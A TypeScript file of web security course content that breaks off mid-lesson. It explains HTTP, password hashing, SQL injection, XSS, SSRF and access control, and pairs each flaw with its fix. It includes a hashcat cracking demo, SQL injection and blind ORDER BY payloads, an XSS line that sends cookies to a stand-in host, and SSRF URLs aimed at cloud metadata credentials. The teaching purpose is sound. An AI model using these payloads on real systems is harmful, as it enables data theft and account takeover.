/**
 * Web Security Fundamentals — full lesson content.
 *
 * Rewritten from an average of 3.3 blocks per lesson. Every vulnerability
 * lesson here follows the same shape: what the flaw actually is at the level of
 * the code, why the obvious fix does not work, and what does.
 *
 * Titles must match scripts/seed-academy/course-3-web.ts exactly.
 */

import {
  type Course, lesson, text, code, callout, check,
  terminal, cmd, out, note, walkthrough, step, diagram, stage, practice,
} from "./blocks";

export const WEB_SECURITY: Course = {
  slug: "web-security-fundamentals",
  modules: [
    {
      title: "HTTP Basics",
      description: "The protocol behind every web attack.",
      lessons: [
        lesson(
          "The Request/Response Cycle",
          "How a browser and server actually talk, and why HTTP being stateless drives most web security design.",
          8,
          [
            text(
              "Every web interaction is a request and a response. The browser sends a request describing what it wants; the server sends back a status, some headers and usually a body.\n\nUnderstanding the shape of these two messages is the foundation for everything else in this course, because every web attack is ultimately a request crafted to make the server do something unintended.",
            ),
            code(
              `GET /account/orders?id=4021 HTTP/1.1
Host: shop.example.com
Cookie: session=eyJhbGciOi...
User-Agent: Mozilla/5.0
Accept: text/html

────────────────────────────────────────

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
Content-Security-Policy: default-src 'self'

<html>...`,
              "http",
              "One exchange. Note that the request carries the identity, and the response carries the security headers.",
            ),
            text(
              "The single most consequential property of HTTP is that it is **stateless**. The server has no memory of the previous request — each one arrives independently and must carry everything needed to identify who is asking.\n\nThat is why sessions exist, and why the cookie in the request above matters so much. Identity is not something the connection remembers; it is something every request has to prove afresh.",
            ),
            callout(
              "important",
              "Everything in a request is attacker-controlled",
              "The path, the parameters, the headers, the cookies, the body — all of it is supplied by the client and all of it can be anything. A browser is only one possible client, and the security of an application cannot depend on the client behaving. This single idea explains most of what follows.",
            ),
            check(
              "An application validates input using JavaScript in the browser before submitting the form. Why is this insufficient on its own?",
              [
                "JavaScript validation is too slow for large forms",
                "A client can send any request it likes without running the page's JavaScript at all",
                "Browsers disable JavaScript validation by default",
                "It only fails when the user has an old browser",
              ],
              1,
              "The browser is a convenience, not a control. Anyone can craft the request directly with curl or a proxy and never execute the validation code. Client-side validation improves user experience; server-side validation is the security boundary.",
            ),
          ],
        ),
        lesson(
          "Status Codes, Methods & Cookies",
          "The vocabulary of HTTP, and the cookie flags that decide whether session theft is easy or hard.",
          7,
          [
            text(
              "Three parts of HTTP carry most of the security-relevant meaning: the method describing what the request wants to do, the status code describing what happened, and the cookies carrying identity between requests.",
            ),
            code(
              `METHODS                          STATUS CODES
GET     retrieve, no side effects    200  OK
POST    submit, changes state        301  moved permanently
PUT     replace a resource           302  found — watch for open redirects
PATCH   modify a resource            401  unauthenticated — who are you?
DELETE  remove a resource            403  authenticated but not allowed
OPTIONS what is permitted here       404  not found — or hidden on purpose
                                     429  rate limited
                                     500  server error — often leaks detail`,
              "text",
              "401 and 403 are different answers. Confusing them leaks information.",
            ),
            text(
              "The distinction between **401** and **403** matters more than it looks. A login form that returns 401 for an unknown username and 403 for a known username with a wrong password has just told an attacker which usernames exist.\n\nThe same applies to timing and to error text. 'No such user' versus 'incorrect password' is a username enumeration oracle, handed over politely.",
            ),
            text(
              "**Cookies** carry the session, which makes their flags a security control rather than a detail.\n\n`HttpOnly` stops JavaScript reading the cookie, which is what turns an XSS bug from session theft into something less severe. `Secure` stops it being sent over plain HTTP. `SameSite` controls whether it is attached to requests originating from other sites, which is the primary defence against cross-site request forgery.",
            ),
            check(
              "A login page returns 'no such user' for unknown accounts and 'incorrect password' for known ones. What has been given away?",
              [
                "Nothing — both responses reject the login",
                "A way to confirm which usernames exist, which narrows any later attack to real accounts",
                "The password hashing algorithm in use",
                "The session cookie for the known account",
              ],
              1,
              "Distinguishing the two cases turns the login form into a username oracle. An attacker enumerates valid accounts first, then sprays a common password against only those — far fewer attempts and far less noise than guessing blindly.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Authentication",
      description: "Getting login right.",
      lessons: [
        lesson(
          "Password Storage & Hashing",
          "Why the choice of algorithm decides what happens on the day your database leaks.",
          8,
          [
            text(
              "Passwords must never be stored in a form that can be reversed. That means hashing — a one-way function — rather than encryption, because anything you can decrypt, an attacker who takes your key can decrypt too.\n\nBut the choice of hash matters enormously, and the property you want is the opposite of what you want everywhere else in computing: you want it to be **slow**.",
            ),
            terminal(
              "The same passwords, two algorithms",
              "student@lab",
              [
                note("A database of MD5 password hashes has leaked. MD5 was designed to be fast, and speed is exactly the wrong property here."),
                cmd("hashcat -m 0 -a 0 leaked_md5.txt rockyou.txt --quiet"),
                out(`Speed.#1.........: 68914.2 MH/s
Recovered........: 3/3 (100.00%)

5f4dcc3b5aa765d61d8327deb882cf99:password
e10adc3949ba59abbe56e057f20f883e:123456
25d55ad283aa400af464c76d713c07ad:password123`),
                note("Sixty-eight billion guesses per second. The entire wordlist took milliseconds."),
                note("Now the same passwords stored with bcrypt at cost factor 12."),
                cmd("head -1 leaked_bcrypt.txt"),
                out(`$2b$12$Nt9AGb1zaTiSD8UEjyKrLuJm4ROlR1r6xtqzeCA0hZvxpDrDdU2Vy`),
                cmd("hashcat -m 3200 -a 0 leaked_bcrypt.txt rockyou.txt --quiet"),
                out(`Speed.#1.........: 4218 H/s
Recovered........: 1/3 (33.33%)

$2b$12$Nt9AGb1zaTiSD8UEjyKrLuJm4ROlR1r6xtqzeCA0hZvxpDrDdU2Vy:password`),
                note("Four thousand per second instead of sixty-eight billion — sixteen million times slower. Note what did not change: 'password' still fell. A slow hash buys time proportional to password strength; it does not rescue weak passwords."),
              ],
            ),
            text(
              "Two more properties are essential.\n\nA **salt** is a unique random value per password, stored alongside the hash. Without it, identical passwords produce identical hashes — so cracking one breaks every account that shared it, and precomputed rainbow tables work. Modern algorithms handle salting for you.\n\nThe **cost factor** is stored inside the hash string itself, which is what lets you raise it later and upgrade existing hashes on next login without a migration.",
            ),
            callout(
              "danger",
              "Never write your own password hashing",
              "Use bcrypt, scrypt, or Argon2id through a maintained library. Home-made schemes — SHA-256 applied a few times, a custom salt arrangement — consistently fail in ways that are not obvious from reading the code, and the failure only becomes visible after the database has leaked.",
            ),
            check(
              "Why is a fast hash such as SHA-256 a poor choice for password storage, despite being cryptographically strong?",
              [
                "SHA-256 produces collisions too frequently for this use",
                "Speed is the attacker's advantage — billions of guesses per second make offline cracking cheap",
                "SHA-256 cannot be salted",
                "It produces output that is too short to be secure",
              ],
              1,
              "SHA-256 is perfectly sound as a hash; it is simply designed to be fast, which is the wrong property when the threat model is an attacker with the hashes and unlimited time. Deliberately slow algorithms make each guess cost something.",
            ),
          ],
        ),
        lesson(
          "Sessions, Tokens & Brute Force",
          "Keeping a user logged in without handing an attacker the keys, and stopping automated guessing.",
          7,
          [
            text(
              "Because HTTP is stateless, staying logged in means the client presents something on every request. There are two common approaches and they fail differently.\n\n**Server-side sessions**: the client holds an opaque identifier, and the server holds the state. Revoking is trivial — delete the record. **Tokens such as JWTs**: the client holds signed claims, and the server verifies the signature. Nothing to look up, but revoking before expiry is genuinely hard.",
            ),
            code(
              `                    Server session        JWT
──────────────────  ────────────────────  ─────────────────────
Server state        Required              None
Revocation          Immediate             Hard — needs a blocklist
Scales across nodes Needs shared store    Trivially
If stolen           Valid until revoked   Valid until it expires
Contains data       No — opaque id        Yes — readable by anyone`,
              "text",
              "JWT payloads are base64, not encrypted. Never put anything secret in one.",
            ),
            text(
              "That last row causes real incidents. A JWT payload is base64-encoded, not encrypted — anyone holding the token can read every claim in it. Signing proves it has not been altered; it does nothing to hide the contents.\n\nThe other classic JWT failure is accepting the `alg` header from the token itself. A server that trusts it can be handed `alg: none` and will verify a token with no signature at all. Pin the algorithm server-side.",
            ),
            text(
              "**Brute force** protection needs to work on both axes. Limiting attempts per account stops someone guessing many passwords against one user. It does nothing against **password spraying** — one common password tried against thousands of accounts, which stays under any per-account threshold.\n\nRate limiting therefore has to apply per account and per source, and the most effective single control remains phishing-resistant MFA, which makes a correct password insufficient on its own.",
            ),
            check(
              "An application rate-limits login attempts to five per account per hour. Why does this fail to stop password spraying?",
              [
                "Five attempts per hour is too generous a threshold",
                "Spraying tries one password across many accounts, so no single account exceeds the limit",
                "Rate limits cannot be applied to login endpoints",
                "Spraying uses a different HTTP method that bypasses the check",
              ],
              1,
              "The limit is scoped to the wrong dimension. One attempt against ten thousand accounts stays far under a per-account threshold while still testing ten thousand passwords, which is why source-based limiting and MFA are needed alongside it.",
            ),
          ],
        ),
      ],
    },
    {
      title: "SQL Injection",
      description: "The classic that still breaks the web.",
      lessons: [
        lesson(
          "How SQL Injection Works",
          "What happens when user input is treated as code, and why the flaw is about construction rather than content.",
          9,
          [
            text(
              "SQL injection happens when user input becomes part of a query's structure rather than remaining data. The root cause is always the same: the query is assembled by joining strings together, so the database cannot tell where the developer's instruction ends and the user's input begins.\n\nEverything else about the vulnerability follows from that one fact.",
            ),
            code(
              `// The flaw: input is concatenated into the query text
const q = "SELECT * FROM users WHERE email = '" + email + "'";

// Normal input
email = "sarah@example.com"
  → SELECT * FROM users WHERE email = 'sarah@example.com'

// Input that closes the string and adds a condition
email = "x' OR '1'='1"
  → SELECT * FROM users WHERE email = 'x' OR '1'='1'
                                          └── always true ──┘`,
              "javascript",
              "The apostrophe ends the intended string. Everything after it is read as SQL.",
            ),
            text(
              "Notice what the attacker actually did. They did not supply an unusual email address — they supplied a fragment of SQL, and the application obligingly pasted it into a query and asked the database to run it.\n\nThe database behaved perfectly correctly throughout. It was given a query that says 'return every row' and it returned every row.",
            ),
            diagram(
              "From one apostrophe to the whole database",
              "Each stage tells the attacker something the last one did not. The early stages are reconnaissance and are the ones a defender can most easily detect.",
              [
                stage("Probing", "T1190", "A single apostrophe is submitted into each parameter. A database error, a changed response, or a different response time indicates the input reaches a query unescaped. This stage is noisy and is where detection is cheapest."),
                stage("Confirming", "T1190", "A logically true condition such as OR 1=1 is added. If the response changes to include more rows than it should, injection is confirmed rather than suspected."),
                stage("Mapping the query", "T1190", "The attacker determines the number and types of columns, usually with ORDER BY or UNION SELECT with increasing placeholders, so results can be returned in the page."),
                stage("Reading the schema", "T1213", "System tables such as information_schema.tables are queried through the injection point, revealing every table and column name in the database."),
                stage("Extracting data", "T1005", "Credentials, personal data or payment details are read out through the same channel, often in bulk once the schema is known."),
                stage("Escalating beyond the database", "T1059", "Depending on privileges and engine, the attacker may write files to disk, read local files, or execute commands — which turns a data breach into host compromise."),
              ],
            ),
            callout(
              "warning",
              "Blind injection leaves no error message",
              "Suppressing database errors does not fix the vulnerability. Where no output is returned, an attacker infers data one bit at a time from whether the page changes, or from how long the response takes when a deliberate delay is injected. It is slower and completely automatable.",
            ),
            check(
              "Why is escaping apostrophes in user input an unreliable defence against SQL injection?",
              [
                "Apostrophes cannot be escaped in most databases",
                "It addresses one symptom of building queries by string concatenation, leaving numeric contexts and other characters exposed",
                "Escaping breaks legitimate names such as O'Brien",
                "Modern databases ignore escape sequences entirely",
              ],
              1,
              "The vulnerability is that input reaches the query as structure. A numeric parameter needs no apostrophe to be injectable, so escaping quotes leaves that path completely open — the fix has to change how the query is built, not filter what goes into it.",
            ),
          ],
        ),
        lesson(
          "Preventing SQL Injection",
          "Parameterised queries, and why every other approach is a partial measure.",
          8,
          [
            text(
              "There is one reliable fix: **parameterised queries**, also called prepared statements. The query structure is sent to the database separately from the values, so the database knows which part is instruction and which is data before it ever sees the input.\n\nInput can then contain any characters at all. It will be treated as a value because it arrived as a value, not because it was filtered.",
            ),
            code(
              `// Vulnerable — structure and data are concatenated
db.query("SELECT * FROM users WHERE email = '" + email + "'");

// Safe — structure and data travel separately
db.query("SELECT * FROM users WHERE email = $1", [email]);

// Safe — an ORM parameterises for you
await prisma.user.findUnique({ where: { email } });

// STILL VULNERABLE — raw interpolation defeats the ORM
await prisma.$queryRawUnsafe(
  \`SELECT * FROM users WHERE email = '\${email}'\`
);`,
              "javascript",
              "The last one is the trap. Using an ORM does not help if you interpolate anyway.",
            ),
            text(
              "Two things cannot be parameterised: table names and column names. If either genuinely has to be dynamic — a sortable column, say — the only safe approach is an **allow-list**. Compare the input against a fixed set of permitted values and use the matched constant, never the input itself.\n\nDefence in depth applies here too. The database account used by the application should have the minimum rights it needs, so that a missed injection point reads one table rather than the whole schema.",
            ),
            practice(
              "The query below is vulnerable. Rewrite it as a parameterised query using a placeholder rather than string concatenation.",
              ["$1", "userId"],
              `db.query("SELECT * FROM orders WHERE user_id = $1", [userId])`,
              "The value moves out of the query text and into a separate argument, so the database parses the structure before it ever sees the input. This is the whole fix — no escaping, no filtering, and it holds for any characters the user supplies.",
              {
                setup: {
                  label: "Vulnerable code",
                  code: `const userId = req.query.id;
db.query("SELECT * FROM orders WHERE user_id = " + userId);`,
                },
                forbids: ["+ userId", "${userId}"],
              },
            ),
            check(
              "A team uses an ORM throughout but has one raw query built with template interpolation. What is their exposure?",
              [
                "None — the ORM protects all queries in the application",
                "That single query is injectable, and one injection point is usually enough to reach the whole database",
                "Only that query's own table can be affected",
                "Raw queries are automatically parameterised by the database driver",
              ],
              1,
              "Protection is per-query, not per-application. A single interpolated query gives the same access as if nothing were parameterised anywhere, because from there the attacker can query the schema and read other tables.",
            ),
          ],
        ),
        lesson(
          "Mini Assessment: Spot the SQLi",
          "Review a set of query-building code the way a reviewer would, and find the one that is exploitable.",
          6,
          [
            text(
              "Below are four ways the same application builds queries. Exactly one is exploitable. Read them before the walkthrough and decide which — and, more importantly, why the other three are not.",
            ),
            code(
              `// A
const rows = await db.query(
  "SELECT * FROM products WHERE category = $1", [req.query.cat]);

// B
const sort = req.query.sort;
const rows = await db.query(
  \`SELECT * FROM products ORDER BY \${sort}\`);

// C
const id = parseInt(req.params.id, 10);
if (Number.isNaN(id)) return res.status(400).end();
const rows = await db.query("SELECT * FROM products WHERE id = $1", [id]);

// D
const rows = await prisma.product.findMany({
  where: { name: { contains: req.query.q } } });`,
              "javascript",
              "One of these four is exploitable. Which, and why?",
            ),
            walkthrough(
              "Reviewing four queries for injection",
              "The instinct is to look for apostrophes and user input together. The more reliable question is narrower: does any user input end up as part of the query's structure rather than as a value?",
              [
                step(
                  "Rule out A — parameterised, so input is a value",
                  "The category comes straight from the query string with no validation at all, which looks alarming. But it is passed as a parameter, so the database receives the structure and the value separately and can never interpret it as SQL.",
                  {
                    insight: "Unvalidated input is not the same as injectable input. Parameterisation makes the content irrelevant to the query's structure.",
                  },
                ),
                step(
                  "Rule out C — parameterised and additionally constrained",
                  "This one both coerces to an integer and parameterises. Either alone would be sufficient against injection; together they also reject malformed input early with a clean 400.",
                  {
                    evidence: {
                      label: "Why the integer parse is not the important part",
                      code: `parseInt("1 OR 1=1", 10)  →  1        // coercion discards the payload
db.query("... id = $1", [id])        // and it is a parameter anyway`,
                    },
                    insight: "Worth noting the order of protection: the parameterisation is doing the security work, and the parse is doing input validation. They are different jobs.",
                  },
                ),
                step(
                  "Rule out D — the ORM builds a parameterised query",
                  "Prisma's `contains` compiles to a parameterised LIKE. The user's search text is bound as a value, so even a string full of SQL syntax is searched for literally.",
                  {
                    insight: "This would be different if it used $queryRawUnsafe with interpolation. The ORM is not magic — it is safe because of what it does with the input, not because it is an ORM.",
                  },
                ),
                step(
                  "B is the exploitable one — ORDER BY cannot be parameterised",
                  "A column name is part of the query's structure, so no placeholder exists for it. The value is interpolated directly into the statement, which is exactly the condition for injection.",
                  {
                    evidence: {
                      label: "Exploiting B",
                      code: `?sort=name
  → SELECT * FROM products ORDER BY name

?sort=(CASE WHEN (SELECT substr(password,1,1) FROM users
        WHERE id=1)='a' THEN name ELSE price END)
  → row order reveals one character at a time`,
                    },
                    insight: "It returns no error and no database output, so it looks harmless. The ordering of the results is the channel — this is blind injection, and it is fully automatable.",
                  },
                ),
                step(
                  "Fix B with an allow-list, not with escaping",
                  "Compare the input against a fixed set of permitted column names and use the matched constant. Escaping cannot help here, because the value has to be a bare identifier to work at all.",
                  {
                    evidence: {
                      label: "The fix",
                      code: `const SORTABLE = { name: "name", price: "price", added: "created_at" };
const column = SORTABLE[req.query.sort] ?? "name";
const rows = await db.query(\`SELECT * FROM products ORDER BY \${column}\`);`,
                    },
                    insight: "The interpolation remains, and it is now safe — because what is interpolated is one of three constants the developer wrote, never anything the user supplied.",
                  },
                ),
              ],
            ),
            check(
              "Why can an ORDER BY column not be protected by a query parameter?",
              [
                "Parameters are only supported in WHERE clauses by most drivers",
                "A column name is part of the query's structure, and parameters can only carry values",
                "ORDER BY is evaluated before parameters are bound",
                "It can be, but only for numeric column positions",
              ],
              1,
              "Parameterisation works by separating structure from data before parsing. An identifier is structure, so there is nothing to bind — which is why the only safe pattern is choosing from a fixed set of names the developer controls.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Cross-Site Scripting (XSS)",
      description: "Injecting scripts into other users' browsers.",
      lessons: [
        lesson(
          "How XSS Works",
          "Getting your script to run in someone else's session, and the three variants that behave differently.",
          9,
          [
            text(
              "Cross-site scripting is injection into a page rather than into a query. Attacker-supplied content is rendered into HTML without being neutralised, so the browser parses it as markup and executes any script it contains.\n\nThe crucial consequence is *whose* browser runs it. The script executes in the victim's session, with their cookies, their permissions and the site's own origin — so from the application's point of view, the attacker's actions are indistinguishable from the user's.",
            ),
            code(
              `// The flaw: user content written straight into HTML
element.innerHTML = "Welcome back, " + username;

// Normal
username = "Sarah"        → Welcome back, Sarah

// Injected
username = "<img src=x onerror=fetch('https://evil.test/'+document.cookie)>"
                          → the browser parses a tag and fires onerror`,
              "javascript",
              "No script tag needed. Any element with an event handler will do.",
            ),
            text(
              "There are three variants, and they differ in where the payload lives.\n\n**Stored** — the payload is saved by the application (a comment, a profile field) and served to everyone who views it. The most severe, because it needs no interaction from the victim beyond visiting a normal page.\n\n**Reflected** — the payload is in the request and echoed into the response, so the attacker must get the victim to follow a crafted link.\n\n**DOM-based** — the payload never reaches the server. Client-side JavaScript reads from the URL or storage and writes it into the page, so server-side defences see nothing at all.",
            ),
            callout(
              "danger",
              "XSS defeats most other client-side controls",
              "Script running in the page's own origin can read the DOM, submit forms, call authenticated APIs and read any storage the page can reach. CSRF tokens do not help, because the script simply reads the valid token from the page before using it.",
            ),
            check(
              "Why is DOM-based XSS invisible to a web application firewall inspecting requests?",
              [
                "It uses encrypted payloads that a firewall cannot read",
                "The payload is often in the URL fragment, which browsers never send to the server",
                "It only affects browsers with JavaScript disabled",
                "Firewalls only inspect responses, not requests",
              ],
              1,
              "Everything after the `#` in a URL stays in the browser. Client-side code reads it from location.hash and writes it into the page, so the server — and anything inspecting server traffic — never sees the payload at all.",
            ),
          ],
        ),
        lesson(
          "Preventing XSS",
          "Encoding on output, and why input filtering is the wrong layer to fix this at.",
          8,
          [
            text(
              "The reliable fix is **context-aware output encoding**: whenever untrusted data is written into a page, encode it for the specific place it is going. The same string needs different treatment in HTML text, in an attribute, in JavaScript and in a URL.\n\nModern frameworks do this by default, which is why XSS is far rarer than it used to be — and why the bugs that remain are almost always in the places where a developer deliberately opted out.",
            ),
            code(
              `// Safe — the framework encodes for HTML context
<div>{username}</div>                      // React
<div>{{ username }}</div>                  // Vue, Angular

// Unsafe — explicitly opting out of encoding
<div dangerouslySetInnerHTML={{__html: bio}} />   // React
element.innerHTML = bio;                          // plain DOM
<div v-html="bio"></div>                          // Vue

// Safe in plain DOM — assigns text, never parses markup
element.textContent = bio;`,
              "javascript",
              "Grep your codebase for the middle group. That is where XSS lives now.",
            ),
            text(
              "Where HTML genuinely must be allowed — a rich text editor, for instance — filtering it yourself is a losing game. The parser has enormous surface, and bypasses for hand-written filters are found continually.\n\nUse a maintained sanitiser such as DOMPurify with an allow-list of permitted tags and attributes, and keep it updated. This is one of the clearest cases where writing your own is strictly worse than using someone else's.",
            ),
            text(
              "Two headers add meaningful depth. **Content-Security-Policy** restricts where scripts may load from and can block inline execution entirely, which turns many injection points into nothing. **HttpOnly** on the session cookie stops script reading it — it does not prevent XSS, but it removes session theft from the list of things an XSS bug achieves.",
            ),
            check(
              "Why is filtering `<script>` tags from user input an inadequate defence?",
              [
                "Script tags are needed for legitimate functionality",
                "Script execution has many other routes — event handler attributes, javascript: URLs, SVG — and encoding on output covers all of them",
                "Input filtering is too slow for high-traffic applications",
                "Browsers reinstate stripped script tags automatically",
              ],
              1,
              "Blocking one syntax leaves every other route open, and `<img src=x onerror=...>` needs no script tag at all. Encoding at the point of output addresses the actual problem — data being parsed as markup — regardless of what the payload looks like.",
            ),
          ],
        ),
      ],
    },
    {
      title: "SSRF & Request Forgery",
      description: "Making the server attack itself.",
      lessons: [
        lesson(
          "Server-Side Request Forgery",
          "Tricking a server into making requests on the attacker's behalf, and why cloud environments make it severe.",
          8,
          [
            text(
              "Server-side request forgery occurs when an application fetches a URL supplied by the user. The attacker cannot reach internal systems directly — but the server can, and the server will do as it is told.\n\nThe application becomes a proxy into the network it sits in, which is usually a far more trusted position than the internet.",
            ),
            code(
              `// A feature: fetch a user-supplied image for a preview
app.post("/preview", async (req, res) => {
  const response = await fetch(req.body.url);   // any URL at all
  res.send(await response.text());
});

// Intended
url = "https://example.com/logo.png"

// Internal service the attacker cannot reach directly
url = "http://10.0.0.5:8080/admin/users"

// Cloud instance metadata — credentials
url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`,
              "javascript",
              "The last URL is why SSRF is treated as critical in cloud environments.",
            ),
            text(
              "That final address is the reason SSRF escalated from a curiosity to a top-tier finding. `169.254.169.254` is the cloud instance metadata service, reachable from inside a virtual machine and holding the temporary credentials of the role attached to it.\n\nAn SSRF that reaches it turns a web bug into cloud credentials — and those credentials are frequently far more privileged than the web application itself.",
            ),
            callout(
              "warning",
              "Blind SSRF still works",
              "Even when the response is never shown, the attacker learns from timing and error differences — an open port responds differently from a closed one. That is enough to map an internal network, and enough to reach services that act on a request without needing to return anything.",
            ),
            check(
              "Why is SSRF considered more severe in cloud environments than in traditional data centres?",
              [
                "Cloud networks are inherently less segmented",
                "The instance metadata service exposes credentials to anything that can make an HTTP request from the host",
                "Cloud providers disable outbound filtering by default",
                "Cloud applications make more outbound requests in general",
              ],
              1,
              "The metadata endpoint is reachable without authentication from inside the instance and returns the role's temporary credentials. That converts a request-forgery bug directly into cloud API access, which is why IMDSv2's requirement for a PUT token exists.",
            ),
          ],
        ),
        lesson(
          "Defending Against SSRF",
          "Allow-lists, network controls, and why blocking internal addresses is harder than it looks.",
          6,
          [
            text(
              "The instinctive defence — reject URLs pointing at internal addresses — is much harder to get right than it appears, because there are many ways to express the same destination.",
            ),
            code(
              `All of these can reach 127.0.0.1 or an internal host:

  http://127.0.0.1          http://0177.0.0.1     (octal)
  http://localhost          http://2130706433     (decimal)
  http://[::1]              http://127.1
  http://attacker.test      → DNS resolves to 10.0.0.5
  http://safe.test          → resolves twice: safe, then internal (TOCTOU)`,
              "text",
              "The last two defeat any check performed before the request is made.",
            ),
            text(
              "The last case is worth understanding. A check that resolves the hostname, approves the address, and then makes the request can be defeated by a DNS record that returns a safe address to the check and an internal one to the fetch. This is a time-of-check to time-of-use problem, and it means validation alone is never sufficient.",
            ),
            text(
              "What actually works is layered and mostly not in the application.\n\n**Allow-list destinations** where possible — if the feature only needs to reach three known partners, permit exactly those. **Enforce at the network**, so the service that makes outbound fetches cannot route to internal ranges or the metadata endpoint regardless of what the application decides. **Require IMDSv2**, which needs a PUT to obtain a token and so defeats simple GET-only SSRF. **Do not follow redirects**, or re-validate at every hop.",
            ),
            check(
              "Why can validating a URL's resolved address before fetching it be bypassed?",
              [
                "Address validation cannot handle IPv6",
                "DNS can return a different address on the second lookup, so the address checked is not the address fetched",
                "Applications cannot resolve hostnames before making a request",
                "Validation only works for HTTPS URLs",
              ],
              1,
              "The check and the fetch are two separate resolutions, and an attacker controlling the DNS record can answer them differently. This is why the durable control is at the network layer, where the destination is enforced when the connection is actually made.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Access Control",
      description: "Enforcing who can do what.",
      lessons: [
        lesson(
          "Broken Access Control & IDOR",
          "The most common serious web vulnerability, and why it is invisible to scanners.",
          8,
          [
            text(
              "Broken access control means an application authenticates users correctly and then fails to check what they are entitled to reach. It is consistently the most prevalent serious web vulnerability, and the most common form is **insecure direct object reference**: an identifier in the request that the server trusts without verifying ownership.",
            ),
            code(
              `// Vulnerable — authenticated, but never checks whose order this is
app.get("/api/orders/:id", requireLogin, async (req, res) => {
  const order = await db.order.findUnique({ where: { id: req.params.id } });
  res.json(order);
});

// GET /api/orders/4021  → my order
// GET /api/orders/4022  → someone else's order, returned happily

// Fixed — ownership is part of the query, not a separate check
const order = await db.order.findFirst({
  where: { id: req.params.id, userId: req.user.id },
});
if (!order) return res.status(404).end();`,
              "javascript",
              "Scoping the query to the user is more reliable than fetching then comparing.",
            ),
            text(
              "This class of bug is largely invisible to automated scanning. A scanner sees a 200 response containing a valid-looking order and has no way to know it belonged to someone else. Finding it requires knowing what *should* be permitted, which is business logic rather than a pattern.\n\nThat is why access control testing is done with two accounts: log in as one, collect the identifiers, and try them as the other.",
            ),
            callout(
              "important",
              "Unguessable identifiers are not access control",
              "Replacing sequential ids with UUIDs makes enumeration harder and changes nothing about authorisation. Identifiers leak — through referrals, logs, screenshots, shared links and exports — and the moment one does, the object is readable by anyone. Obscurity is a delay, not a boundary.",
            ),
            check(
              "An application switches from sequential order ids to random UUIDs but adds no ownership check. What has changed?",
              [
                "The vulnerability is fixed, because ids can no longer be guessed",
                "Bulk enumeration is much harder, but any leaked id still grants full access",
                "Nothing at all — UUIDs are as guessable as integers",
                "Only the performance of the lookup",
              ],
              1,
              "Enumeration and authorisation are different problems. UUIDs raise the cost of discovering identifiers and provide no protection once one is known, which is precisely the situation whenever an id appears in a log, a URL shared in a ticket, or an exported report.",
            ),
          ],
        ),
        lesson(
          "Privilege Escalation & CSRF",
          "Gaining rights you were not granted, and having your browser act against you.",
          7,
          [
            text(
              "**Privilege escalation** in a web application takes two forms. Horizontal — reaching another user's data at the same level, which is IDOR. Vertical — gaining a higher role than you were assigned.\n\nVertical escalation usually comes from trusting client-supplied state. A role sent in a request body, a hidden form field, an unsigned cookie, or a JWT claim the server does not verify. If the client can set it, it is not a permission.",
            ),
            code(
              `// Mass assignment — the whole body is trusted
await db.user.update({ where: { id }, data: req.body });
// POST { "displayName": "Sarah", "role": "ADMIN" }  → now an admin

// Fixed — take only the fields a user may change
const { displayName, bio } = req.body;
await db.user.update({ where: { id }, data: { displayName, bio } });`,
              "javascript",
              "Mass assignment turns a profile form into a privilege escalation.",
            ),
            text(
              "**Cross-site request forgery** is different in character: the attacker never sees the response and never steals a credential. They cause the victim's browser to send an authenticated request the victim did not intend.\n\nIt works because browsers attach cookies to requests automatically, based on the destination, regardless of which site initiated them.",
            ),
            text(
              "Two defences, and both are now straightforward.\n\n**SameSite cookies** — `Lax` is the modern browser default and stops cookies being attached to most cross-site requests. **Anti-CSRF tokens** — a per-session value the attacker's site cannot read due to same-origin policy, submitted with every state-changing request.\n\nNote what does not defend: checking the Referer header, which is frequently absent, and using POST rather than GET, which a hidden auto-submitting form defeats entirely.",
            ),
            check(
              "An application accepts a `role` field in its profile update endpoint and saves the whole request body. What is the flaw?",
              [
                "Cross-site request forgery, because the profile form is not token-protected",
                "Mass assignment allowing vertical privilege escalation — a user can set their own role",
                "Insecure direct object reference on the profile id",
                "Cross-site scripting via the profile fields",
              ],
              1,
              "The request body is entirely attacker-controlled, so accepting it wholesale lets a user write any column the update touches, including their own role. The fix is to select the permitted fields explicitly rather than to filter the dangerous ones.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Secure Coding",
      description: "Building it right from the start.",
      lessons: [
        lesson(
          "Secure Coding Principles",
          "Habits that prevent whole categories of bug rather than individual instances.",
          8,
          [
            text(
              "The vulnerabilities in this course are individually different and share a small number of root causes. Coding habits that address the causes prevent bugs you have not thought of yet, which is a much better return than fixing instances.",
            ),
            text(
              "**Validate at the boundary, encode at the point of use.** Check input for shape as it enters — is this an integer, is this a permitted value. Encode it for context when it leaves — SQL parameter, HTML text, shell argument. These are separate jobs, and conflating them produces the classic mistake of sanitising input and hoping it is safe everywhere.\n\n**Fail closed.** When a check errors, deny. A permission function that returns false on an exception is safe; one that returns true is a vulnerability waiting for a database timeout.",
            ),
            code(
              `// Fails open — an exception grants access
async function canEdit(user, doc) {
  try { return (await getPerms(user, doc)).includes("edit"); }
  catch { return true; }               // a timeout grants everyone edit
}

// Fails closed
async function canEdit(user, doc) {
  try { return (await getPerms(user, doc)).includes("edit"); }
  catch (err) { logger.error({ err }, "permission check failed");
                return false; }
}`,
              "javascript",
              "The difference is one word, and it decides what happens on a bad day.",
            ),
            text(
              "**Make the safe path the easy path.** If the codebase has a helper that builds queries safely, developers will use it. If safety requires remembering a rule on every call site, it will be forgotten — not through carelessness but because that is what happens to rules that depend on memory.\n\n**Do not invent cryptography.** Use maintained libraries for hashing, encryption and token handling. This is the area where confident, plausible-looking code fails in ways that are invisible until exploited.",
            ),
            check(
              "A permission check returns `true` when the underlying service times out, so users are not blocked by outages. What is the consequence?",
              [
                "Nothing significant, as timeouts are rare in production",
                "Anyone who can cause a timeout gains the permission — the check becomes an availability-triggered bypass",
                "Only administrators are affected",
                "The permission is granted but not persisted, so it is harmless",
              ],
              1,
              "Failing open converts a reliability problem into an authorisation bypass, and load is something an attacker can often influence. Denying on error is correct: an outage should degrade availability, never confidentiality.",
            ),
          ],
        ),
        lesson(
          "Dependencies & Secrets",
          "The risk you inherit from other people's code, and the credentials that end up in repositories.",
          7,
          [
            text(
              "A modern application is mostly code someone else wrote. A typical Node project pulls in hundreds of transitive dependencies, and every one of them runs with the same privileges as your own code.\n\nThis is not an argument against dependencies — writing everything yourself is worse. It is an argument for knowing what you have.",
            ),
            code(
              `Practice                     Addresses
